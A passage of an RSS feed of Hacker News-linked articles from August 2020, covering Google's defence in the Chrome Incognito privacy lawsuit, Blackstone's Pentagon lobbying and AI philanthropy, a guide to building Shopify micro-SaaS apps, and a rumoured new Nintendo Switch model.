August 24, 2020 | https://androidrookies.com/google-says-incognito-mode-does-not-mean-invisible-in-chrome-incognito-mode-privacy-lawsuit-hearing/ | <a href="https://web.archive.org/web/*/https://androidrookies.com/google-says-incognito-mode-does-not-mean-invisible-in-chrome-incognito-mode-privacy-lawsuit-hearing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-10501"><div><div><div><h2>‘Incognito Mode’ does not mean ‘invisible’ says Google as it asks San Jose judge to dismiss the lawsuit alleging Chrome Incognito Mode privacy breach</h2><p>Google wants the San Jose Judge to trash a privacy lawsuit that alleged that the search giant was collecting data of users even though they used Google’s <a href="https://androidrookies.com/websites-can-still-detect-if-you-use-incognito-mode-in-chrome-despite-googles-promise-to-fix-it/">Chrome browser’s Incognito Mode</a>. The potential class-action lawsuit was filed in June by California residents Chasom Brown and Maria Nguyen and Florida resident William Byatt against Google LLC and it’s parent Alphabet Inc. for collecting user’s information even though they were using the Chrome browser Incognito Mode.</p><p>Brown &amp; Co. allege that they were tracked by Google, despite using the Chrome browser’s incognito mode to visit sites including CNN.com, Apartments.com, and NYTimes.com.&nbsp;They cited that the Google Analytics and Google Ad Manager results show the users Google’s collection of IP addresses, browser and device information, and web pages’ content even if the user is using Incognito Mode in Chrome Browser.</p><p>The lawsuit claimed that according to Google Privacy Policy and Disclosures misdirect users into thinking that using Incognito Mode makes their web session private. The plaintiffs allege that when Chrome users command the browser to open an incognito window, they are greeted with a message stating that Chrome won’t save browsing history, cookies and site data, and information entered in forms. But the message also tells users their activity may be “visible” to websites they visit. The lawsuit further alleges that this data can be used for “device fingerprinting.”</p><p>Device fingerprinting aka canvas fingerprinting, browser fingerprinting, and machine fingerprinting is a process used to identify a device (or browser) based on its specific and unique configuration. Unlike web cookies that are stored client-side (i.e. on a user’s device), device fingerprints need to be stored server-side — i.e. in a database. It is a very controversial tracking technique that doesn’t rely on cookies but can reveal users’ private information.</p><h2>Google wants the Judge to kick out the Chrome incognito mode privacy lawsuit</h2><p>Google’s lawyers want the federal judge to throw out a lawsuit.&nbsp;“This is not a case where Google received data surreptitiously, much less deceitfully,” Google argues in papers filed Thursday with U.S. District Court Judge Lucy Koh in San Jose. Google’s lawyers said that the lawsuit&nbsp;“is predicated on a willful misreading of Google’s disclosures.”</p><p>The Google’s lawyers urged Judge Koh to dismiss the lawsuit for several reasons. Google says that it’s privacy policy and disclosures tell the users that <a href="https://androidrookies.com/websites-can-still-detect-if-you-use-incognito-mode-in-chrome-despite-googles-promise-to-fix-it/">Chrome’s incognito mode</a> only prevents data from being stored on their devices and not as stated by the plaintiffs.</p><p>“Incognito mode prevents previously-set cookies on the browser from being shared with the websites visited, in order to make the device appear as a new user,” Google reply to the lawsuit states. “’Incognito” does not mean “invisible,’ however, and the fact that some unidentified users visited websites and reviewed certain pages is not hidden from the websites themselves, or from any third-party analytics or ads services they use.”</p><p>In simple words using your Chrome browser’s incognito mode doesn’t guarantee you privacy as per Google privacy policy and disclosures. Google is already facing another <a href="https://androidrookies.com/google-accused-of-recording-chrome-users-personal-data-regardless-of-user-consent/">privacy lawsuit</a> for collecting users’ information consent through its Android Lockbox.</p><p><a href="https://www.classaction.org/media/brown-et-al-v-google-llc-et-al.pdf">Brown et al. v. Google LLC et al. – 5:20-cv-03664(PDF)</a> – ClassAction lawsuit is being heard by Lucy Koh in San Jose Federal Court.</p></div></div></div></article></div>]]>
            </description>
            <link>https://androidrookies.com/google-says-incognito-mode-does-not-mean-invisible-in-chrome-incognito-mode-privacy-lawsuit-hearing/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24261208</guid>
            <pubDate>Mon, 24 Aug 2020 14:49:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Reason Why Blackstone Is Courting the Pentagon]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24261199">thread link</a>) | @jules-jules
<br/>
August 24, 2020 | https://unlimitedhangout.com/2020/08/reports/the-real-reason-why-blackstone-is-courting-the-pentagon/ | <a href="https://web.archive.org/web/*/https://unlimitedhangout.com/2020/08/reports/the-real-reason-why-blackstone-is-courting-the-pentagon/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Originally published at&nbsp;<em><a href="https://www.thelastamericanvagabond.com/real-reason-blackstone-courting-pentagon/">The Last American Vagabond</a></em></p><p>One of Wall Street’s largest private equity firms, the Blackstone Group, has been making a series of moves that have left mainstream analysts puzzled, with the most recent being&nbsp;<a href="https://www.cnbc.com/2020/08/17/blackstone-hires-pro-trump-lobbyist-to-target-pentagon-state-department.html">Blackstone’s hire of David Urban</a>, a Washington lobbyist with close ties to the Trump administration.&nbsp;</p><p>Blackstone’s courting of a Trump ally was not surprising given that the firm’s CEO, Steven Schwarzman, recently donated $3 million to Trump’s re-election efforts and had previously chaired the President’s now-defunct Strategic and Policy Forum of “business leaders” and advisors. The close ties that have developed between Schwarzman and Trump following the latter’s election in late 2016 have led mainstream media to describe Schwarzman as a confidant of the President.</p><p>However, what&nbsp;<em>was</em>&nbsp;odd about Blackstone’s hiring of David Urban was its murky reason for doing so, as the firm plans to task Urban with lobbying the Pentagon and State Department on “issues related to military preparedness and training.” This is odd,&nbsp;<a href="https://www.cnbc.com/2020/08/17/blackstone-hires-pro-trump-lobbyist-to-target-pentagon-state-department.html">as&nbsp;<em>CNBC</em>&nbsp;noted</a>, because Blackstone “doesn’t have any publicly listed government contracts, and its known investments don’t appear to have direct links to the defense industry.” However, Urban has extensive experience in dealing with both Departments in addition to his close ties to the current administration and the fundraising apparatus of the Republican Party.</p><p>While media reports on Blackstone’s recent hire of Urban were unable to elucidate the motive behind Blackstone’s sudden desire to court the Pentagon and State Department, they did note that Blackstone’s&nbsp;<a href="https://www.cnbc.com/2020/04/27/coronavirus-relief-investment-firms-spent-millions-lobbying-trump-congress.html">previous hire</a>&nbsp;of a Trump-connected fundraiser lobbyist, Jeff Miller, had been remarkably successful earlier this year, with Miller lobbying Congress specifically on coronavirus relief legislation like the CARES Act. The CARES Act&nbsp;<a href="https://www.vanityfair.com/news/2020/04/how-private-equity-is-winning-the-coronavirus-crisis">ultimately allowed</a>&nbsp;private equity giants like Blackstone to access funds designated for coronavirus relief, likely thanks to the efforts of Miller and other lobbyists hired by Blackstone as well as other private equity giants like the Carlyle Group.</p><p>Though&nbsp;<em>CNBC</em>&nbsp;was left looking for answers as to Blackstone’s sudden interest in aiding the Pentagon with “military preparedness” and wooing the State Department, the likely motive may be related to other recent moves made by the company, such as the hire of former Amazon and Microsoft executive Christine Feng. Feng, who was hired by Blackstone&nbsp;<a href="https://www.marketwatch.com/press-release/blackstone-hires-former-amazon-executive-christine-feng-as-senior-managing-director-2020-08-03">on August 3</a>, previously led data and analytics mergers and acquisitions at Amazon Web Services (AWS), which is a contractor to the U.S. intelligence community and other U.S. federal agencies. Previously, Feng was a senior member of Microsoft’s Corporate Development team. Microsoft recently won lucrative contracts for information technology (IT) services and cloud computing for&nbsp;<a href="https://www.mintpressnews.com/state-department-credits-pandemic-it-privatization/269585/">the State Department</a>&nbsp;and&nbsp;<a href="https://www.crn.com/news/cloud/pentagon-cio-jedi-cloud-re-announcement-should-come-by-end-of-august?itc=refresh">Pentagon</a>, respectively.&nbsp;</p><p>According to&nbsp;<a href="https://www.marketwatch.com/press-release/blackstone-hires-former-amazon-executive-christine-feng-as-senior-managing-director-2020-08-03">Blackstone executives</a>, the decision to hire Feng was made due to her “deep relationships in Silicon Valley” and “her experience working at Amazon and Microsoft.” They also added that her hire was motivated by Blackstone’s push to “identify new opportunities to invest and partner with innovative companies reshaping the world” and Blackstone’s recent effort to “<a href="https://fortune.com/2020/08/05/blackstone-is-hunting-heads-and-cutting-checks-as-it-doubles-down-on-tech/">double down</a>” on tech sector investments. Notably, Feng’s hire came just a few months after Blackstone had hired Vincent Letteri, another tech-focused investor experienced with growth-stage tech companies, and amid a series of&nbsp;<a href="https://fortune.com/2020/08/05/blackstone-is-hunting-heads-and-cutting-checks-as-it-doubles-down-on-tech/">recent investments</a>&nbsp;by Blackstone in tech firms, including HealthEdge software and Chinese data center provider 21Vianet, among others.</p><h3 id="schwarzmans-push-for-common-governance"><strong>Schwarzman’s Push for “Common Governance”</strong></h3><p>It strongly appears that Blackstone’s recent moves, including Urban’s hire, are part of the firm’s bid to become one of the top “innovative companies reshaping the world” as the Artificial Intelligence (AI) arms race becomes a key driver in the “reshaping” of the global economy. Blackstone’s Steven Schwarzman is a key part of the relatively tight-knit group of billionaires and influential political figures, like Henry Kissinger and Eric Schmidt, that are working to create a “global compact on the research, introduction, and deployment of AI,” and Schwarzman has heralded the coming age of AI as representing a “<a href="https://news.sky.com/story/oxford-university-given-150m-donation-to-fund-ai-ethics-institute-11744587">fourth revolution</a>” for humanity.&nbsp;</p><p>Schwarzman argued for greater global collaboration on AI-driven technologies, particularly between the U.S. and China, in a July 2020 Op-Ed&nbsp;<a href="https://finance.yahoo.com/news/the-case-for-a-global-compact-on-artificial-intelligence-stephen-schwarzman-115923986.html">for&nbsp;<em>Yahoo! Finance</em></a>&nbsp;where he wrote that the establishment of “common governance structures” for the research, introduction and deployment of AI is necessary if “we are to avoid the negative consequences of AI,” ultimately comparing the current pace of development of AI to that of past arms races, such as those involving nuclear and biological weapons. Per Schwarzman, these “common governance structures” would produce “explicit global commitments, agreements, and eventually international laws with consequences for violation” that relate directly to AI and its use.&nbsp;</p><figure><img src="https://unlimitedhangout.com/wp-content/uploads/2020/08/UrbanAmanpour-1024x469.jpg" alt="" srcset="https://unlimitedhangout.com/wp-content/uploads/2020/08/UrbanAmanpour-1024x469.jpg 1024w, https://unlimitedhangout.com/wp-content/uploads/2020/08/UrbanAmanpour-300x137.jpg 300w, https://unlimitedhangout.com/wp-content/uploads/2020/08/UrbanAmanpour-768x352.jpg 768w, https://unlimitedhangout.com/wp-content/uploads/2020/08/UrbanAmanpour-1536x703.jpg 1536w, https://unlimitedhangout.com/wp-content/uploads/2020/08/UrbanAmanpour-380x174.jpg 380w, https://unlimitedhangout.com/wp-content/uploads/2020/08/UrbanAmanpour-800x366.jpg 800w, https://unlimitedhangout.com/wp-content/uploads/2020/08/UrbanAmanpour-1160x531.jpg 1160w, https://unlimitedhangout.com/wp-content/uploads/2020/08/UrbanAmanpour.jpg 1712w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>David Urban on Amanpour &amp; Co (PBS)</figcaption></figure><p>Blackstone’s head is convinced that these “common governance structures” should be built between the U.S. and China, hence his heavy investment in universities and artificial intelligence education in both countries. For instance, Schwarzman created the Schwarzman Scholars program in 2016 where around 100-200 students from around the world pursue a Master’s Degree in Global Affairs at Tsinghua University in Beijing annually. The&nbsp;<a href="https://www.schwarzmanscholars.org/about/">official goal</a>&nbsp;of the program, which was modeled after the Rhodes Scholars program, is to “create a growing network of global leaders that will build strong ties between China and the rest of the world.” The&nbsp;<a href="https://www.schwarzmanscholars.org/about/advisors/">program’s advisors</a>&nbsp;include former Secretary of States Henry Kissinger, Condoleezza Rice and Colin Powell and former UK Prime Minister Tony Blair as well as former World Bank President James Wolfensohn and former U.S. Secretary of the Treasury and Goldman Sachs executive Henry Paulson. Schwarzman&nbsp;<a href="https://www.independent.co.uk/news/education/education-news/oxford-university-donation-stephen-schwarzman-ai-study-robots-trump-a8964731.html">has also donated</a>&nbsp;hundreds of millions of dollars to create an AI-focused institute at Oxford University.</p><p>Then, in the U.S., Schwarzman&nbsp;<a href="https://news.mit.edu/2018/faq-mit-stephen-schwarzman-college-of-computing-1015">gave $350 million</a>&nbsp;to MIT, prompting the school to create the Schwarzman College of Computing, which aims to specifically “address the global opportunities and challenges presented by the ubiquity of computing — across industries and academic disciplines — and by the rise of artificial intelligence.”&nbsp;<em>MIT News</em>&nbsp;later noted that “the impulse behind the founding of the college came from trips he [Schwarzman] had taken to China, where he observed intensified Chinese investment in artificial intelligence, and wanted to make sure the U.S. was also on the leading edge of A.I.” The college’s inauguration also featured Henry Kissinger as a speaker, where Kissinger mulled the potential impacts of AI and&nbsp;<a href="https://www.bostonherald.com/2019/02/28/kissinger-warns-of-dangers-of-ai-at-mit-as-students-protest-his-presence/">stated that</a>&nbsp;“AI makes it technically possible, easier, to control your population.”</p><p>Eric Schmidt, the former CEO of Google, credits Schwarzman’s lead to invest in AI education in the U.S. and abroad as determining “the future of American philanthropy.” “Steve’s donation triggered an arms race among all the universities to match him. This is the next trend in philanthropy, in my view,” Schmidt&nbsp;<a href="https://www.axios.com/future-ai-philanthropy-09701d2e-5d28-4c49-b170-a84d64b2d8e0.html">told&nbsp;<em>Axios</em></a>&nbsp;regarding Schwarzman’s MIT donation last May. Schmidt also stated that his own investment in Princeton University’s Computer Science department had been prompted by Schwarzman’s previous acts of “AI philanthropy.”</p><p>Last May, a federal commission that Schmidt chairs, called the National Security Commission on AI (NSCAI), produced a document that was obtained by a FOIA request earlier this year. One particularly important page made a point that was essentially repeated in Schwarzman’s July Op-Ed regarding a “global AI compact.” Titled “<a href="https://epic.org/foia/epic-v-ai-commission/EPIC-19-09-11-NSCAI-FOIA-20200331-3rd-Production-pt9.pdf">The Importance of a US/China AI Cooperation</a>,” it begins with a quote from Kissinger, a&nbsp;<a href="https://sociable.co/technology/google-is-a-threat-to-civilization-and-eric-schmidt-is-one-of-my-best-friends-henry-kissinger/">key advisor to and “great friend”</a>&nbsp;of Schmidt, about the need for “arms control negotiation” for AI and then states that “the future of [AI] will be decided at the intersection of private enterprise and policy leaders between China and the US.” In other words, the Schmidt-chaired NSCAI argues that the future of AI will be determined by the political leaders and business leaders of China and the U.S. The page also adds that “we [The United States] risk being left out of the discussions where norms around AI are set for the rest of our lifetimes. Apple, Amazon, Alibaba, and Microsoft will not be.”&nbsp;</p><p>This is particularly significant given the NSCAI is tasked with making recommendations to the federal government regarding how to move forward with AI regulations within the context of “national security” and its members include key members of the Pentagon, U.S. intelligence community and Silicon Valley behemoths that double as contractors to the U.S. military, U.S. intelligence or both. One of the NSCAI’s interests, per the FOIA-obtained document, is the use of “AI in diplomacy,” suggesting that it also seeks to explore potential State Department uses for AI. Notably, earlier this year, and a year after the aforementioned NSCAI document was written, the State Department saw key aspects of its IT infrastructure privatized and given over to NSCAI-linked companies&nbsp;<a href="https://www.mintpressnews.com/state-department-credits-pandemic-it-privatization/269585/">like Microsoft</a>.</p><h3 id="the-establishment-divide-over-ai"><strong>The Establishment Divide over AI</strong></h3><p>Given Schwarzman’s views on AI, his AI-focused “philanthropy,” and Blackstone’s recent pivot towards technology, it becomes easier to understand why Blackstone has recently hired David Urban to lobby the Department of Defense and the State Department. Over the last few years, Schwarzman ally Eric Schmidt has “<a href="https://www.nytimes.com/2020/05/02/technology/eric-schmidt-pentagon-google.html">reinvented himself</a>&nbsp;as the prime liaison between Silicon Valley and the national security community” through his chairing of the NSCAI and other positions and has been lobbying “to revamp America’s defense forces with more engineers, more software and more A.I.” Blackstone’s plans to use David Urban to woo the Pentagon are likely directly related to these efforts to speed up and determine not just when but how the U.S. …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://unlimitedhangout.com/2020/08/reports/the-real-reason-why-blackstone-is-courting-the-pentagon/">https://unlimitedhangout.com/2020/08/reports/the-real-reason-why-blackstone-is-courting-the-pentagon/</a></em></p>]]>
            </description>
            <link>https://unlimitedhangout.com/2020/08/reports/the-real-reason-why-blackstone-is-courting-the-pentagon/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24261199</guid>
            <pubDate>Mon, 24 Aug 2020 14:48:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Making money building Shopify micro-SaaS apps]]>
            </title>
            <description>
<![CDATA[
Score 241 | Comments 62 (<a href="https://news.ycombinator.com/item?id=24261192">thread link</a>) | @gk1
<br/>
August 24, 2020 | https://www.preetamnath.com/blog/building-your-first-micro-saas-app-on-shopify | <a href="https://web.archive.org/web/*/https://www.preetamnath.com/blog/building-your-first-micro-saas-app-on-shopify">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Starting your first business can be a daunting task. There’s so many variables involved - which ones to solve for, which ones to figure out?</p><p>Typically as software engineers and product people, building the product and writing code is not where we falter. </p><p>Where we get stuck is with existential questions like:</p><ul role="list"><li>Does anybody want this app?</li><li>How will I get users?</li></ul><p>And from my little experience in entrepreneurship, I find these questions to be more important than actually designing and building the app. Trust me when I say this.</p><p>Since I’ve been answering questions on email and Twitter DMs around these topics already, writing a guide came as the natural next step.</p><h3>Who this guide is for</h3><ul role="list"><li>You are starting your first micro-SaaS business</li><li>You want to earn extra outside your job, or you want to eventually replace your job income with a business</li><li>You can design apps with a baseline level of UX, and you can write code. Or, you have a business partner who can do these</li><li>You have 10+ hours to allocate every week (initially, more is better) and are in it for the long haul (say 3-6 months before you start seeing significant income from the business)</li><li>You want to serve customer’s needs</li></ul><h3>Who this guide is NOT for</h3><ul role="list"><li>You want to become a millionaire quickly</li><li>You are in it for the short term gain but you don’t see building businesses as your long-term path</li><li>You don’t know the A of design or coding, and neither have a business partner who does</li><li>You don’t have the patience to struggle for 3-6 months when the results might be 0, before things suddenly start to work in your favour</li></ul><p>If this guide is for you, read on. I’ve laid out the index of topics covered in the post. </p><p>Depending on the stage of your journey, feel free to skip to the sections that are most relevant to you.<br></p><h3><strong>Topics covered in this post</strong></h3><ol role="list"><li>Make money building Shopify apps</li><li>Discover problems, niches, and Shopify app ideas</li><li>Standing out from competition</li><li>Shopify App Store optimisation basics</li><li>Find your #1 keyword</li><li>How to build a Shopify app</li><li>Getting customers to review your Shopify app (by delivering great customer support)</li><li>Getting the first customers for your Shopify app</li><li>Finding early users and beta testers for your Shopify app outside the App Store</li><li>Getting listed under the right categories &amp; collections, and getting featured on the Shopify App Store</li><li>The right pricing model for your Shopify app</li><li>Optimising for trials</li><li>Long term game plan in the Shopify App Store</li></ol><p>‍<br></p><h2><strong>Make money building Shopify apps</strong></h2><p>Shopify isn’t the only choice when it comes to picking an apps marketplace. There’s </p><ul role="list"><li><a href="https://slack.com/apps" target="_blank">Slack</a></li><li><a href="https://marketplace.atlassian.com/" target="_blank">Atlassian</a></li><li><a href="https://appexchange.salesforce.com/" target="_blank">Salesforce</a></li><li><a href="https://gsuite.google.com/marketplace" target="_blank">GSuite Marketplace</a></li><li><a href="https://chrome.google.com/webstore/category/extensions" target="_blank">Chrome Web Store</a></li><li><a href="https://play.google.com/store/apps" target="_blank">Google Play Store</a></li><li><a href="https://www.apple.com/in/ios/app-store/" target="_blank">Apple iOS App Store</a></li><li><a href="https://apps.apple.com/us/genre/mac/id39?mt=12" target="_blank">Mac App Store</a></li></ul><p>All these marketplaces are valid options for you to start. I would lean on a marketplace where there’s a combination of 2 factors</p><ol role="list"><li><strong>Familiarity with problems</strong> - You know what the core product is about, you understand or can empathise with its users maybe from using the tool at your previous workplace, you have an idea on the different kind of problems that exist in the ecosystem and don’t find it too boring to solve them</li><li><strong>Skillset to execute</strong> - If you don’t know how to build Android, iOS, or Mac apps, perhaps steer clear of it. Your goal is not to take on a hard challenge, it’s to take on a challenge where you have some advantage from skill and insight. The goal is to win.<br></li></ol><h3>Why you should pick the Shopify app marketplace:</h3><ul role="list"><li><strong>Huge distribution:</strong> Marketing is often a big reason for a business’s failure, the App Store takes care of it. Shopify has 1mn+ merchants and tons of new signups every month who go to the app store browsing for solutions. <br>Shopify promotes apps within its product and has made it an integral part of its user journey. A new app is able to gain traction fairly easily in the app marketplace, which makes it friendly to newcomers. <br>Marketing is often a big reason for a business’s failure, the App Store takes care of it.</li><li><strong>Tons of app opportunities:</strong> E-commerce store owners have 101+ problems to be taken care of, and you can address any one and do a great job at it to build a sustainable business. It’s not hard (relative standards) to gain 200 paying customers paying you $10/mo to earn $2000/mo ($1600 after Shopify’s 20%)</li><li><strong>Ease of development:</strong> Shopify’s documentation and APIs are first-class, they get out of the way allowing you to build fast. Additionally, Shopify’s <a href="https://polaris.shopify.com/" target="_blank">Polaris UI framework</a> makes building app interfaces a piece of cake. It’s based on React and comes with a Sketch/Figma file to help you design and prototype solutions fast.</li><li><strong>Billing taken care of:</strong> Heads up, Shopify takes a 20% commission on all earnings. So if your app’s monthly subscription fees is $10, you get $8. In return, Shopify takes care of billing end to end.<br>You can charge monthly, annually, charge per activity, provide app credit, and issue refunds with very little effort. You don’t need to worry about failed payments, Shopify takes care of it. You don’t even need to generate an invoice, app bills are included in the merchant’s monthly Shopify invoice.</li><li><strong>Familiarity with ecommerce:</strong> If you’re someone who can jump into an industry and learn all about it, great. If not, you would want some familiarity with how an ecommerce store works, what are the typical problems faced by a merchant.<br>You can do this by creating a Shopify store and trying to sell your own products. Or you could have conversations with 10 different store owners and absorb from their experience. You could also find someone who works at an e-commerce agency for valuable insights. It’s not that hard.<br></li></ul><h3>Why you shouldn’t pick the Shopify app marketplace:</h3><ul role="list"><li><strong>Copycat galore:</strong> You’re likely to copy an existing app and make a slight improvement in terms of product, pricing, or both. Guess what, the next smart person with the same idea can do the same to you. If you’re dependent on getting all or majority of your customers from the app store, be ready for stiff competition from copycats. <br>This doesn’t mean you cannot grow your app to $1k or $10k MRR. SaaS is not a winner take all market. It just means that it gets harder to grow as you grow. If this is something you are not mentally prepared for, steer clear. <br>There’s ways you can grow out of this by taking a long term strategy, either by taking a brand-centric approach (brand is not your name, but the experience that customers remember you by for which they’ll choose you over a copycat). <br>Or you can go upmarket and target large volume and Plus merchants, where ticket sizes are $200/mo or higher and switching does not happen often. </li><li><strong>Low-end, high-maintenance customers:</strong> Majority of Shopify merchants are people who don’t want to pay beyond $10-$15/mo and yet they expect world-class customer service. Some will ask for phone support or to jump on a video call. <br>You can tackle this by solving problems where the ticket sizes are higher, in the range of $50-$100/mo, but also expect it to be significantly harder to rank and fight existing competitors in such problem spaces. Example - <a href="https://apps.shopify.com/search?q=page+builder" target="_blank">page builders</a>, <a href="https://apps.shopify.com/search?q=product+reviews" target="_blank">product review</a> apps. <br>You can mitigate this by going in with the mindset that you’ll be serving $15/mo customers, so your app better be self-serve ready, have a dead simple UX and sufficient documentation or walkthrough videos. You can also aim to be the cost-leader of a segment, example - <a href="https://apps.shopify.com/judgeme" target="_blank">Judge.me</a> </li></ul><p>‍<br></p><h2><strong>Discover problems, niches, and Shopify app ideas</strong></h2><p>I’ve previously written about <a href="https://www.preetamnath.com/blog/shopify-micro-saas-growth" target="_blank">uncovering opportunities on Shopify</a> and I also shared all my research in my big <a href="https://docs.google.com/spreadsheets/d/1Hnpcl1VAlPC9MuFvvsl2UsU0yu1iM6aKR-iK30VtbwA/edit?usp=sharing" target="_blank">Shopify app ideas spreadsheet</a>. Let me reiterate on the advice shared there in a more structured manner that will hopefully better answer questions like:</p><ul role="list"><li>“How do you find niches in the app store in the first place?”</li><li>“How to find a problem worth solving within shopify? (worth solving=stressful enough for merchants &amp; competition not too tough)”<br></li></ul><p>There have been people who have asked me what kind of problems to solve, or what are the underserved niches. The thing is - if there's an obviously underserved niche and people have taken the time to research about it, they are probably busy solving it. If it's being posted in any blog post, know that it's no longer an underserved or hidden niche, because clearly anyone could find it.</p><p>Ultimately, only you can find an idea that you find worthy enough to pursue, whose various pros and cons are justified in your mind. And therefore, I can only provide a directional framework towards evaluating ideas. I can't list out ideas.</p><p>The best use of a directional framework is to</p><ol start="" role="list"><li><strong>First</strong> - cast a wide net, get to know what's out there</li><li><strong>Second</strong> - narrow down your search based on parameters you have decided</li></ol><p>This first section of the article will help you with casting a wide net. </p><p>As you go further along the article, I've shared ideas and techniques which you can use to narrow down your search.<br></p><h3>1- Browse the entire App Store</h3><p>I recommend this as the starting point for anyone new to the Shopify ecosystem. Start by browsing all the categories &amp; sub-categories of apps on the app store. You can do the same on <a href="https://sasi.unionworks.co.uk/categories" target="_blank">SASI</a>. </p><p>The purpose of browsing this way is to familiarise yourself with the different types of problems faced by merchants and being solved by apps. Ideally, you want to note down some interesting apps that you come across during your browsing adventure to investigate later on.</p><figure id="w-node-892fc283544a-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f1c114edd643e073591f8cc_browse%20categories%20shopify%20app%20store.png" alt=""></p></figure><h3>2- Go through every letter in search autocomplete</h3><p>Okay, this is a step I took when&nbsp;I was browsing the app store. I would type in "aa", "ab", "ac"... ... ... "zz" on the search bar, note the autocomplete terms and check the results of ones I found to be interesting.</p><p>Turns out, Shopify has since updated their algorithm. Autocomplete suggestions only show up after you type 3 letters now. So you can't recreate what I did with autocomplete and go through every letter. It's not feasible anymore.</p><p>Not to worry, it's still useful.</p><h4>Plug in keywords of shortlisted apps into the search bar</h4><p>From step 1, all the apps (hopefully at least a dozen) that you shortlisted for being interesting, extract the keywords used in the app's title or description. </p><p>Now, enter those keywords in search to find whether they …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.preetamnath.com/blog/building-your-first-micro-saas-app-on-shopify">https://www.preetamnath.com/blog/building-your-first-micro-saas-app-on-shopify</a></em></p>]]>
            </description>
            <link>https://www.preetamnath.com/blog/building-your-first-micro-saas-app-on-shopify</link>
            <guid isPermaLink="false">hacker-news-small-sites-24261192</guid>
            <pubDate>Mon, 24 Aug 2020 14:47:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nintendo might launch new more powerful Switch console early next year]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24261188">thread link</a>) | @GamerNintendo
<br/>
August 24, 2020 | https://nintendosmash.com/nintendo-might-launch-new-more-powerful-switch-console-early-next-year/ | <a href="https://web.archive.org/web/*/https://nintendosmash.com/nintendo-might-launch-new-more-powerful-switch-console-early-next-year/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="the-post">
			
			<p><img width="622" height="330" src="https://nintendosmash.com/wp-content/uploads/2020/03/nintendo-switch-Us-stock-622x330.jpg" alt="Nintendo might launch new more powerful Switch console early next year" srcset="https://nintendosmash.com/wp-content/uploads/2020/03/nintendo-switch-Us-stock-622x330.jpg 622w, https://nintendosmash.com/wp-content/uploads/2020/03/nintendo-switch-Us-stock-310x165.jpg 310w" sizes="(max-width: 622px) 100vw, 622px">		</p>
	
		


			<div>

							

						
<p>
		
	
	
		
	<span><i></i>3 days ago</span>	
	<span><i></i><a href="https://nintendosmash.com/category/news/" rel="category tag">News</a></span>
	
	
</p>

			
				<div>
					
					
					
<p>The Economic Daily newspaper, one of the most recognized in Taiwan, is causing a stir on the Internet. Apparently, their sources have shared that Nintendo would be working on a new model of Nintendo Switch.</p>




<p><a href="http://www.emsodm.com/html/vip/temp/2020/08/24/1598239179207.html">Rumor</a> has it that this model would have better interactivity and image quality and would coexist with the current successful model. Its production would begin in the third quarter of this year with a view to its commercialization, scheduled for the first months of 2021.</p>



<p>The sources of the newspaper affirm that this information comes from companies in charge of the production of Nintendo Switch, which is carried in part in Taiwan. However, Nintendo has not announced anything official on this subject at the moment.</p>



<p>We will have to be attentive to see what this rumor is about because in the past there have already been other similarities and at the moment nothing has been reported. In the meantime, we recommend that you stay tuned until more details are provided.</p>

 
















<!-- AI CONTENT END 3 -->
					
									</div><!-- .entry /-->
								
				
				 <!-- .share-post -->				
			</div><!-- .post-inner -->
		</article><section id="check-also-box">
		<a href="#" id="check-also-close"><i></i></a>

		<p>
			<h3>Check Also</h3>
		</p>

				<div>
						
			<p><a href="https://nintendosmash.com/nintendo-confirms-more-nintendo-direct-mini-partner-showcase-in-the-future/">
					<img width="310" height="165" src="https://nintendosmash.com/wp-content/uploads/2020/08/direct-mini-310x165.jpg" alt="Nintendo confirms more Nintendo Direct Mini: Partner Showcase in the future">					<span></span>
				</a>
			</p><!-- post-thumbnail /-->
						
			<h2><a href="https://nintendosmash.com/nintendo-confirms-more-nintendo-direct-mini-partner-showcase-in-the-future/" rel="bookmark">Nintendo confirms more Nintendo Direct Mini: Partner Showcase in the future</a></h2>
			<p>As you know, today the second Official Nintendo Direct Mini: Partner Showcase was shared. Well, …</p>
		</div>
				<div>
						
			<p><a href="https://nintendosmash.com/gotham-knights-is-by-no-means-a-service-game-action-details-from-wb-montreal/">
					<img width="310" height="165" src="https://nintendosmash.com/wp-content/uploads/2020/08/wb-310x165.jpg" alt="&quot;Gotham Knights is by no means a service game&quot;: action details from WB Montreal">					<span></span>
				</a>
			</p><!-- post-thumbnail /-->
						
			<h2><a href="https://nintendosmash.com/gotham-knights-is-by-no-means-a-service-game-action-details-from-wb-montreal/" rel="bookmark">“Gotham Knights is by no means a service game”: action details from WB Montreal</a></h2>
			<p>In an interview. the staff of WB Montreal, the creative director and lead producer of …</p>
		</div>
				<div>
						
			<p><a href="https://nintendosmash.com/playstation-5-certified-in-brazil-for-wi-fi-6-and-bluetooth-5-1/">
					<img width="310" height="165" src="https://nintendosmash.com/wp-content/uploads/2020/08/ps5-desing-310x165.jpg" alt="PlayStation 5 certified in Brazil for Wi-Fi 6 and Bluetooth 5.1">					<span></span>
				</a>
			</p><!-- post-thumbnail /-->
						
			<h2><a href="https://nintendosmash.com/playstation-5-certified-in-brazil-for-wi-fi-6-and-bluetooth-5-1/" rel="bookmark">PlayStation 5 certified in Brazil for Wi-Fi 6 and Bluetooth 5.1</a></h2>
			<p>Sony has filed documents for PS5 certification in Brazil – as, in other countries, the …</p>
		</div>
				
			</section></div>]]>
            </description>
            <link>https://nintendosmash.com/nintendo-might-launch-new-more-powerful-switch-console-early-next-year/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24261188</guid>
            <pubDate>Mon, 24 Aug 2020 14:47:21 GMT</pubDate>
        </item>
        <item>
            <title>
